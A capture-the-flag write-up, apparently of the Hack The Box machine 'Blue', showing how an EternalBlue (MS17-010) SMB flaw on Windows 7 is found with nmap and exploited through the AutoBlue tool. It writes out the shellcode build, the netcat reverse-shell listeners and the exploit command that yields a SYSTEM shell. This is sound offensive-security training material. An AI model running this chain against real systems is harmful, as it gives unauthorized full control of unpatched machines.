## Machine Info

## Enumeration

Initial `nmap` scans using `autorecon` show a basic layout of SMB/RPC, with the SMB service returning our target OS as Windows 7 Pro.

```

The great thing about `autorecon` is that it will do deeper `nmap` scans for the ports it does find. When it ran a SMB vuln check on port 445, it found the following:

```
smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
```

Looks like the machine is vulnerable to EternalBlue (MS17-010). While this attack vector would be cake with Metasploit, I'm going to go the non-MSF route, since I'm training for the OSCP exam.

## Initial Shell

### Clone the AutoBlue repository

Since we won't be using MSF for the easy win, we'll need to use some other exploits to more manually exploit the machine. The [AutoBlue repository](https://github.com/3ndG4me/AutoBlue-MS17-010) is perfect for this. Yes, it still has pre-built exploits, and automates the building of the shellcode for you. But it's still a much more manual process then Metasploit, where you literally just point and click.

To grab the repo, we can use the following command sequence. This will change our directory to `/opt`, clone the repo to `/opt/autoblue`, and navigate to the new directory.

```shell
cd /opt
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git autoblue
cd autoblue
```

Now that we have the tools we need, we can start assembling some shellcode.

### Build shellcode

Part of what makes `AutoBlue` so great is that it helps you to pre-build the shellcode with a built-in script.

From the `/opt/autoblue` directory, we need to `cd` to the `shellcode` directory, and run `./shell_prep.sh`. From there, simply enter the information requested. The script will feed the variables into `msfvenom` to generate the shellcode files. It will also merge them into a single file, which gives us a single bullet, that will handle both x86 and x64 targets.

You'll note that I decided to go with a stageless, non-meterpreter payload. This way I can simply run dual `nc` listeners to capture the returned shell later.

### Setup listeners

While `AutoBlue` does contain a script to setup and launch MSF listeners for you (via the `exploit/multi/handler` module), my experience with this script has been pretty poor. Since I'm running stageless and non-meterpreter, simple `nc` listeners will capture the shell just fine. Remember that since the x86 and x64 shellcode was merged, and targeted at different ports, we need to setup listeners on both ports 7500 and 7600.

We can run `nc -lvnp 7500` and `nc -lvnp 7600` to setup the listeners.

### Run the exploit

Now that we have all the parts needed, we can run the actual exploit.

From the `/opt/autoblue` directory, we can run the `eternalblue_exploit7.py` script. The help text shows that we need to specify the target IP and shellcode file.

We can run the command `python eternalblue_exploit7.py 10.10.10.40 shellcode/sc_all.bin` to trigger the exploit.

Taking a look at the `nc` listeners, we get a shell back on port 7600 (via the x64 shellcode)

Running `whoami` reveals that we're already running as `nt authority\system`, so privlege escalation won't be needed.

### Loot!

All that's left is to grab the flags on the system.

We know `root.txt` is in `C:\Users\Administrator\Desktop` like normal, so we can easily grab that.

However, since we came in as `nt authority\system`, we haven't had to touch any user accounts.

If we run `dir` on `C:\Users`, we can see the name of the user we're looking for is `haris`. Sure enough, the `user.txt` flag is in `C:\Users\haris\Desktop`.
